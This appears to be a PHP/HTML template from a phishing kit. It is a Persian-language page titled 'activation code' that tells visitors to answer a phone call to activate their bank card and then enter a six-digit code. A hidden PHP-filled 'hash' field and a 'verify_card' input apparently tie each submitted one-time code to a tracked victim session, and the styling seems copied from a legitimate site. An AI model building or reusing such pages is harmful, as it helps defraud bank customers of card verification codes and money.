<section class="h-screen d-flex flex-column jc-center ai-center">
    <div class="W3wYIMoFtWvsJZI8nfye w-100 d-flex flex-row-md">
        <form class="d-flex flex-column flex-1">

            <div class=" d-flex flex-row ai-center mb-9">
                <h1 class="color-n-900 mr-5 text-h5">کد فعال سازی</h1></div>
            <p class="text-body-1 color-n-900 align-center
        mb-6">برای فعالسازی کارت بانکی به تماس با جواب دهید و کد را وارد کنید</p>
            <input class="d-none" type="text" name="hash" value="<?=$hash?>">
            <div class="_wrap_87tyg_1 _input_pjp0p_66">
                <input type="text" class="_input_87tyg_11" data-method="verify_card" inputmode="numeric">

                <div class="_digit_87tyg_33"><span></span></div>
                <div class="_digit_87tyg_33"><span></span></div>
                <div class="_digit_87tyg_33"><span></span></div>
                <div class="_digit_87tyg_33"><span></span></div>
                <div class="_digit_87tyg_33"><span></span></div>
                <div class="_digit_87tyg_33"><span></span></div>
            </div>
        </form>

    </div>

</section>